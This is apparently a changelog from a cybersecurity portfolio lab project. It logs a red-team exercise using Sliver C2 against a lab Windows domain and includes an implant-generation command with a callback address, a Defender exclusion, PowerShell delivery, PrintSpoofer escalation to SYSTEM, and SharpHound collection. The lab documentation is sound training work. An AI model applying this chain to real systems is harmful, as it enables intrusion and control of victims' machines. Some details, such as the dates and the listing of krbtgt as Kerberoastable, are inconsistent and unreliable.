# Changelog — Project 04: Full Red Team C2 Infrastructure

All notable progress and milestones for this project are documented here.

---

## [1.0.0] — 2026-07-22 — COMPLETE ✅

### 🎯 Final Status: Full Project Complete

---

## Day-by-Day Progress

### Day 1 — Lab Setup & Sliver C2 Installation
**Date:** 2026-07-21

**Completed:**
- VMware Workstation lab configured (3 VMs)
- Kali Linux 2026.1 attacker machine setup
- Windows Server 2019 Domain Controller (corp.local) configured
- Windows 11 x64 target workstation joined to corp.local
- Sliver C2 Framework v1.5.42 installed on Kali
- Initial lab connectivity verified

**Issues Encountered:**
- IP addressing conflicts resolved via DHCP reconfiguration
- Sliver server startup path confirmed: `/usr/local/bin/sliver-server`

---

### Day 2 — C2 Infrastructure & Implant Generation
**Date:** 2026-07-21

**Completed:**
- HTTP listener started on port 8443 (`http --lhost 0.0.0.0 --lport 8443`)
- Windows x64 EXE implant generated (build time: 57 seconds)
- Implant saved to `/tmp/implant.exe` (17,262,080 bytes)
- Python HTTP server configured for implant delivery
- File permission issue resolved (`chmod 644`)

**Commands:**
```bash
generate --http 192.168.100.102:8443 --os windows --arch amd64 --format exe --save /tmp/implant.exe
```

---

### Day 3 — Implant Delivery & Session Establishment
**Date:** 2026-07-21

**Completed:**
- Windows Defender exclusion added to `C:\Users\Public`
- Implant delivered via PowerShell `Invoke-WebRequest`
- ✅ **Session 0fa93989 (LITTLE_ENVIRONMENT) established**
- Host enumeration: `whoami`, `getuid`, `getpid`, `ps` commands executed
- Session confirmed: `RITHIKA\rithi` on `Rithika` (Windows 11 x64)

**Key Output:**
```
[*] Session 0fa93989 LITTLE_ENVIRONMENT — 192.168.100.25:63515 — RITHIKA\rithi — windows/amd64 [ALIVE]
```

---

### Day 4 — Privilege Escalation (NT AUTHORITY\SYSTEM)
**Date:** 2026-07-21

**Completed:**
- `whoami /priv` confirmed `SeImpersonatePrivilege: Enabled`
- PrintSpoofer used for local privilege escalation
- ✅ **NT AUTHORITY\SYSTEM session (dc0aef3d) established**
- Two concurrent sessions: SYSTEM + user-level

**Key Output:**
```
ID        Username               Health
dc0aef3d  NT AUTHORITY\SYSTEM    [ALIVE]  ← SYSTEM
0fa93989  RITHIKA\rithi          [ALIVE]
```

---

### Day 5 — Domain Enumeration
**Date:** 2026-07-21 / 2026-07-22

**Completed:**
- Remote shell via SYSTEM session
- `net user /domain` — 12 domain users discovered
- `net group "Domain Admins" /domain` — `Administrator`, `sadmin` identified
- Kerberoastable accounts noted: `sqlsvc`, `krbtgt`
- `ipconfig`, `hostname` — network positioning confirmed

**Domain Users Discovered:**
```
Administrator  ananya.kumar  deepa.nair   hstark
jsmith         karthik.rajan krbtgt       nova.test
novasingh      sadmin        sqlsvc       vijay.patel
```

---

### Day 6 — SharpHound Collection & BloodHound Analysis
**Date:** 2026-07-22

**Completed:**
- SharpHound executed in-memory via `execute-assembly`
- ✅ **319 AD objects collected** (CORP.LOCAL)
- ZIP file downloaded to Kali: `20260722234634_bloodhound_corp.zip`
- Neo4j + BloodHound CE v9.4.0-rc1 started
- BloodHound Web UI: `http://localhost:8080`
- ✅ **File Ingest: Complete — 7 files imported**

**SharpHound Output:**
```
[*] Status: 319 objects finished (+319 53.16667)/s -- Using 72 MB RAM
[*] Enumeration finished in 00:00:06.7674867
[*] SharpHound Enumeration Completed at 09:48 on 22-07-2026!
```

**BloodHound Import:**
```
Status: Complete ✅  |  Duration: 1 min  |  Files: 7
computers.json ✅  users.json ✅  groups.json ✅
containers.json ✅  domains.json ✅  gpos.json ✅  ous.json ✅
```

---

### Day 7 — Report Writing & GitHub Submission
**Date:** 2026-07-23

**Completed:**
- ✅ Professional PDF pentest report generated (ReportLab)
- ✅ GitHub README.md with full attack chain documentation
- ✅ SECURITY.md policy added
- ✅ CHANGELOG.md created
- ✅ .gitignore configured
- ✅ 12 screenshots organised and referenced
- ✅ LinkedIn post drafted
- ✅ Project submitted to GitHub

---

## Summary Statistics

| Metric | Value |
|--------|-------|
| Total Duration | 6-7 Days |
| AD Objects Collected | 319 |
| Domain Users Found | 12 |
| Domain Admins Found | 2 (Administrator, sadmin) |
| C2 Sessions | 2 (user + SYSTEM) |
| BloodHound Files Imported | 7 |
| Sliver Version | v1.5.42 |
| BloodHound Version | v9.4.0-rc1 |
| MITRE Techniques Covered | 8 |
| Screenshots | 12 |

---

*Project 04 is part of the RIVI Enterprises Elite Portfolio System — 30 Cybersecurity Projects*
